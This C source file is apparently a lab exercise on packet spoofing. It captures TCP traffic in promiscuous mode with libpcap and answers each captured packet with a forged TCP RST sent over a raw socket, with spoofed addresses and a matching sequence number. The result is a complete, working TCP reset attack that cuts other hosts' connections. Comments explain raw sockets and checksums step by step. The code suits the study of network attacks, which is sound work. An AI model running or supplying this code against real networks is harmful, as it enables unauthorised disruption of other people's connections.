//
// Created by Rishov Paul on 8/7/21.
//
#include <pcap.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#define TCP_DATA   "Hello rishov here"
/* maximum bytes per packet to capture */
#define MAX_BUF_TO_CAPTURE 1518

#define PACKET_LEN 8192

/* Ethernet addresses are 6 bytes */
#define ETHERNET_ADDRESS_LEN 6

/* Ethernet header */
// ethernet header length 14
struct Ethernet_Header {
    u_char  ethernet_dest_host[ETHERNET_ADDRESS_LEN];    // destination host address , 6 bytes = 48 bits, mac address
    u_char  ethernet_source_host[ETHERNET_ADDRESS_LEN];  // source host address
    u_short ethernet_type;                               // IP? ARP? RARP? etc
};

// IP Header
struct IP_Header {
    unsigned char      iph_ih_len:4,            //IP header length
    iph_version:4;                              //IP version
    unsigned char      iph_tos;                 //Type of service
    unsigned short int iph_len;                 //IP Packet length (data + header)
    unsigned short int iph_identification;      //Identification
    unsigned short int iph_flag:3,              //Fragmentation flags
    iph_offset:13;                              //Flags offset
    unsigned char      iph_ttl;                 //Time to Live
    unsigned char      iph_protocol;            //Protocol type
    unsigned short int iph_checksum;            //IP datagram checksum
    struct  in_addr    iph_source_ip;           //Source IP address
    struct  in_addr    iph_destination_ip;      //Destination IP address
};

/* TCP Header */
struct TCP_Header {
    u_short tcp_source_port;                    /* source port */
    u_short tcp_destination_port;               /* destination port */
    u_int   tcp_sequence_num;                   /* sequence number */
    u_int   tcp_ack_num;                        /* acknowledgement number */
    u_char  tcp_offx2;                          /* data offset, rsvd */
#define TH_OFF(th) (((th)->tcp_offx2 & 0xf0) >> 4)
    u_char  tcp_flags;
#define TH_FIN  0x01
#define TH_SYN  0x02
#define TH_RST  0x04
#define TH_PUSH 0x08
#define TH_ACK  0x10
#define TH_URG  0x20
#define TH_ECE  0x40
#define TH_CWR  0x80
#define TH_FLAGS (TH_FIN|TH_SYN|TH_RST|TH_ACK|TH_URG|TH_ECE|TH_CWR)
    u_short tcp_win;                        /* window */
    u_short tcp_sum;                        /* checksum */
    u_short tcp_urp;                        /* urgent pointer */
};

/* Psuedo TCP header */
struct pseudo_TCP_Header
{
    unsigned source_addr, dest_addr;
    unsigned char mbz;
    unsigned char protocol;
    unsigned short tcp_len;
    struct TCP_Header tcp;
    char payload[1500];
};


unsigned short in_checksum (unsigned short *buf, int length)
{
    unsigned short *w = buf;
    int nleft = length;
    int sum = 0;
    unsigned short temp=0;

    /*
     * The algorithm uses a 32 bit accumulator (sum), adds
     * sequential 16 bit words to it, and at the end, folds back all
     * the carry bits from the top 16 bits into the lower 16 bits.
     */
    while (nleft > 1)  {
        sum += *w++;
        nleft -= 2;
    }

    /* treat the odd byte at the end, if any */
    if (nleft == 1) {
        *(u_char *)(&temp) = *(u_char *)w ;
        sum += temp;
    }

    /* add back carry outs from top 16 bits to low 16 bits */
    sum = (sum >> 16) + (sum & 0xffff);  // add high 16 to low 16
    sum += (sum >> 16);                  // add carry
    return (unsigned short)(~sum);
}

unsigned short calculate_tcp_checksum(struct IP_Header *ip)
{
    struct TCP_Header *tcp = (struct TCP_Header *)((u_char *)ip + sizeof(struct IP_Header ));

    int tcp_len = ntohs(ip->iph_len) - sizeof(struct IP_Header);

    /* pseudo tcp header for the checksum computation */
    struct pseudo_TCP_Header p_tcp;
    memset(&p_tcp, 0x0, sizeof(struct pseudo_TCP_Header));

    p_tcp.source_addr   = ip->iph_source_ip.s_addr;
    p_tcp.dest_addr     = ip->iph_destination_ip.s_addr;
    p_tcp.mbz           = 0;
    p_tcp.protocol      = IPPROTO_TCP;
    p_tcp.tcp_len       = htons(tcp_len); //The htons function can be used to convert an IP port number in host byte order to the IP port number in network byte order
    memcpy(&p_tcp.tcp, tcp, tcp_len);

    return  (unsigned short) in_checksum((unsigned short *)&p_tcp, tcp_len + 12);
}
/**
 *
    struct sockaddr_in {
    short int sin_family;           // Address family, AF_INET(IPV4 address)
    unsigned short int sin_port;    // Port number
    struct in_addr sin_addr;        // Internet address
    unsigned char sin_zero[8];      // Same size as struct sockaddr
    };

    # sin_family corresponds to sa_family in a struct sockaddr and should be set to “AF_INET”.
    # sin_port must be in Network Byte Order (by using htons()) which references the 4-byte IP address
 */

/**
     * *********************************** SOCK_RAW ****************************************
     * For normal sockets, when the kernel receives a packet, it passes the packet
     * through the network protocol stack, and eventually passes the payload to applications
     * via the socket. For raw sockets, the kernel will pass a copy of the packet, including
     * the link-layer header, to the socket (and its application) first, before further passing
     * the packet to the protocol stack. Raw socket does not intercept the packet; it simply gets a copy.
 */

/**
     * socket(domain, type, protocol)

     * domain: integer, communication domain e.g., AF_INET (IPv4 protocol) , AF_INET6 (IPv6 protocol)

     * type: communication type
       SOCK_STREAM: TCP(reliable, connection oriented)
       SOCK_DGRAM: UDP(unreliable, connectionless)

     * protocol: Protocol value for Internet Protocol(IP), which is 0.
     * This is the same number which appears on protocol field in the IP header of a packet.
     * (man protocols for more details)
     */

/** IPPROTO_RAW:
     * Normally, you interact with layer 4 of OSI model (TCP or UDP).
     * If you use IPPROTO_RAW, you will be able to interact directly with layer 3 (IP).
     * This means you are more low level.
     * For example, you can edit the header and payload of your IP packet
     * (normally, the kernel will handle the header in other modes).
     * Edit the payload means that you are free to put what you want directly in the IP payload.
     */


void send_raw_ip_packet(struct IP_Header* ip)
{
    /**
     * Step 1: Creating a raw socket
     *
     * The first argument AF_INET indicates that this is for IPv4
     *
     * For the second argument (socket type), in typical socket programming] we either
     * use SOCK_DGRAM for UDP or SOCK_STREAM for TCP.
     * Here we need to use a different type called SOCK_RAW.
     *
     * For the third argument(protocol) we choose IPPROTO_RAW,
     * indicating that we are going to supply the IP header so system will not
     * try to create an IP header for us.
     * Basically, IPPROTO_RAW implies enabled IP_HDRINCL (i.e. header included)
     */
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if(sock < 1)
    {
        printf("raw socket creation failed at send_raw_ip_packet");
        exit(-1);
    }

    /**
     * Step 2: Setting socket options.
     *
     * After the socket is created, we use set sockopt () to enable IP_HDRINCL on the socket.
     * This step is redundant, because IPPROTO_RAW already implies enabled PP_HDRINCL.
     * We leave this statement in the code to show how to set socket options.
     */
    int enable = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));

    /**
     * Step 3: Providing information about the destination.
     *
     * We do this through a structure called sockaddr_in, which will be passed to the system
     * when sending out packets. In typical socket programming, we need to tell the system the
     * IP address and port number of the destination, as well as the family of the communication
     * facility (AF_INET). The system will use the supplied information to construct the IP header.
     *
     * For raw socket programming, since the destination information is already included in the provided
     * IP header, there is no need to fill in all the fields of the sockaddr_in structure, other than
     * setting the family information (which is AF_INET for IPv4) and the destination IP address.
     * It should be noted that by setting the destination IP address, we help the kernel get the correct
     * MAC address corresponding to the destination if the destination is on the same network
     * (failing to set this field may cause problems).
     */
    struct sockaddr_in destination_info;
    destination_info.sin_family    = AF_INET;
    destination_info.sin_addr      = ip->iph_destination_ip;

    /**
     * Step 4: Sending out the spoofed packet.
     * Finally, we are ready to send out the packet.
     * We use sendto( ) to do that.
     * The second argument is a pointer to the buffer containing the whole IP packet.
     *
     * The third argument is the size of the packet, which can be obtained from the length field of the packet.
     *
     * The fourth argument sets the flags that affect the behavior of the function;
     * we do not use any flag, so we set it to 0.
     *
     * The next two arguments are the pointer to the destination sockaddr_in structure and its size.
     * Since the socket type is raw socket, upon receiving this call,
     * the system will send out the IP packet as is, except for the checksum field,
     * which will be automatically calculated by the system.
     * Several other non-essential fields will also be set by the system
     * if their values are zero (e.g. the source IP address).

     */
    int send_packet_check = sendto(sock, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&destination_info, sizeof(destination_info));

    if(send_packet_check < 0)
    {
        printf("Sending packet failed");
        exit(-1);
    }

    close(sock);
}

void spoof_RST_packet(u_short source_port, u_short destination_port, struct in_addr source_ip, struct in_addr destination_ip, u_int seq){
    // No data, just datagram
    char buffer[PACKET_LEN];
    memset(buffer, 0, PACKET_LEN);

    /* if we want to send data
    char *data = buffer + sizeof(struct IP_Header) + sizeof(struct TCP_Header);
    const char* message = TCP_DATA;
    int message_len = strlen(message);
    strncpy(data, message, message_len);
    */

    // The size of the headers
    struct IP_Header *ip = (struct IP_Header *) buffer;
    struct TCP_Header *tcp = (struct TCP_Header *) (buffer + sizeof(struct IP_Header));

    /*********************************************************
    Step 1: Fill in the TCP header.
    ********************************************************/
    tcp->tcp_source_port        = htons(source_port);
    tcp->tcp_destination_port   = htons(destination_port);
    tcp->tcp_sequence_num       = htonl(seq);
    tcp->tcp_offx2              = 0x50;
    //tcp->tcp_flags              = 0x000;
    //tcp->tcp_flags              = tcp->tcp_flags | 0x040;
    tcp->tcp_flags              = 0x04;//may have to change
    tcp->tcp_win                = htons(16384);
    tcp->tcp_sum                = 0; //will be calculated later

    /*********************************************************
    Step 2: Fill in the IP header.
    ********************************************************/
    ip->iph_version                 = 4;                        // Version (IPv4)
    ip->iph_ih_len                  = 5;                        // Header length
    ip->iph_ttl                     = 20;                       // Time to live
    ip->iph_source_ip.s_addr        = source_ip.s_addr;         // Source IP
    ip->iph_destination_ip.s_addr   = destination_ip.s_addr;    // Destination IP
    ip->iph_protocol                = IPPROTO_TCP;              // The value is 6.
    ip->iph_len                     = htons(sizeof(struct IP_Header) + sizeof(struct TCP_Header));
    //ip->iph_len                     = htons(sizeof(struct IP_Header) + sizeof(struct TCP_Header) + message_len);

    /*********************************************************
    Step 3: Calculate tcp checksum here, as the checksum includes some part of the IP header
    *********************************************************/
    tcp->tcp_sum = calculate_tcp_checksum(ip);

    // No need to fill in the following fields, as they will be set by the system. such as: ip->iph_checksum

    /*********************************************************
    Step 4: Finally, send the spoofed packet
    ********************************************************/

    //printf(" Spoofed!  From: %s\n", inet_ntoa(ip->iph_source_ip));// The inet_ntoa() function converts the Internet host address in, given in network byte order, to a string in IPv4 dotted-decimal notation
    //printf(" Spoofed!    To: %s\n",   inet_ntoa(ip->iph_destination_ip));

    send_raw_ip_packet(ip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
    static int count = 1;                   /* packet counter */
    /* declare pointers to packet headers */
    const struct Ethernet_Header *ethernet;  /* The ethernet header [1] */
    const struct IP_Header *ip;              /* The IP header */
    const struct TCP_Header *tcp;            /* The TCP header */

    //printf("************Packet number %d:\n", count);
    count++;

    // define ethernet header
    ethernet = (struct Ethernet_Header*)(packet);

    if(ntohs(ethernet->ethernet_type) != ETHERTYPE_IP)
    {
        //printf("\nNot an IP packet...skipping.\n");
        return;
    }
    // compute ip header offset
    ip = (struct IP_Header*)(packet + sizeof(struct Ethernet_Header));
    int ip_header_len = (ip -> iph_ih_len) * 4;

    //printf("\nIP header length: %u bytes\n", ip_header_len);

    if (ip_header_len < 20)
    {
        printf("\nInvalid IP header length: %u bytes\n", ip_header_len);
        return;
    }

    // print source and destination IP addresses
    //printf("       From: %s     (Source IP address)\n", inet_ntoa(ip->iph_source_ip));
    //printf("         To: %s     (Destination IP address)\n", inet_ntoa(ip->iph_destination_ip));

    // determine protocol
    switch(ip->iph_protocol) {
        case IPPROTO_TCP:
            //printf("   Protocol: TCP...continue ahead\n");
            break;
        case IPPROTO_IP:
            printf("   Protocol: IP...skipping\n");
            return;
        case IPPROTO_UDP:
            printf("   Protocol: UDP...skipping\n");
            return;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP...skipping\n");
            return;
        default:
            printf("   Protocol: others...skipping\n");
            return;
    }

    // compute tcp header offset
    tcp = (struct TCP_Header*)(packet + sizeof(struct Ethernet_Header) + ip_header_len);
    int tcp_header_len = TH_OFF(tcp) * 4;

    //printf("\nTCP header length: %u bytes\n", tcp_header_len);
    if (tcp_header_len < 20)
    {
        printf("\nInvalid TCP header length: %u bytes\n", tcp_header_len);
        return;
    }

    //spoof_RST_packet(ntohs(tcp -> tcp_source_port), ntohs(tcp -> tcp_destination_port), ip -> iph_source_ip, ip -> iph_destination_ip, ntohl(tcp -> tcp_sequence_num) + 1 );
    spoof_RST_packet(ntohs(tcp -> tcp_destination_port), ntohs(tcp -> tcp_source_port), ip -> iph_destination_ip, ip -> iph_source_ip, ntohl(tcp -> tcp_ack_num));

    return;
}

int main(int argc, char **argv)
{
    char *device = NULL;			            // capture device name
    char error_buffer[PCAP_ERRBUF_SIZE];		// error buffer
    pcap_t *handle;				                // packet capture handle
    char filter_exp[] = "tcp";		            // filter expression [3]
    struct bpf_program filter;			        // compiled filter program (expression)
    bpf_u_int32 subnet_mask;			        // subnet mask
    bpf_u_int32 net;			                // ip
    int num_packets = 0;			            // number of packets to capture

    /* find a capture device if not specified on command-line */
    device = pcap_lookupdev(error_buffer);

    //printf("Device: %s\n", device);


    if (device == NULL)
    {
        fprintf(stderr, "Couldn't find default device: %s\n", error_buffer);
        exit(EXIT_FAILURE);
    }

    /* get network number and subnet_mask associated with capture device */
    if (pcap_lookupnet(device, &net, &subnet_mask, error_buffer) == -1)
    {
        fprintf(stderr, "Couldn't get netmask for device %s: %s\n", device, error_buffer);
        net = 0;
        subnet_mask = 0;
    }

    /* print capture info */
    printf("Device: %s\n", device);
    printf("Number of packets: %d\n", num_packets);
    printf("Filter expression: %s\n", filter_exp);

    /* open device for live capture */
    //pcap_t *pcap_open_live(const char *device, int snaplen, int promiscuous_mode, int to_ms, char *error_buffer);
    int packet_buffer_timeout = 1000;//in miliseconds
    int promiscuous_mode = 1; // non zero means enabled
    handle = pcap_open_live(device, MAX_BUF_TO_CAPTURE, promiscuous_mode, packet_buffer_timeout, error_buffer);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device %s: %s\n", device, error_buffer);
        exit(EXIT_FAILURE);
    }

    /* make sure we're capturing on an Ethernet device [2] */
//    if (pcap_datalink(handle) != DLT_EN10MB)
//    {
//        fprintf(stderr, "%s is not an Ethernet\n", device);
//        printf("%s is not an Ethernet\n", device);
//        exit(EXIT_FAILURE);
//    }

    /* compile the filter expression */
    if (pcap_compile(handle, &filter, filter_exp, 0, net) == -1)
    {
        fprintf(stderr, "Bad filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* apply the compiled filter */
    if (pcap_setfilter(handle, &filter) == -1)
    {
        fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
        exit(EXIT_FAILURE);
    }

    /* now we can set our callback function */
    // A value of -1 or 0 for num_packets is equivalent to infinity,
    // so that packets are processed until another ending condition occurs.
    pcap_loop(handle, num_packets, got_packet, NULL);

    /* cleanup */
    pcap_freecode(&filter);
    pcap_close(handle);

    printf("\nCapture complete.\n");

    return 0;
}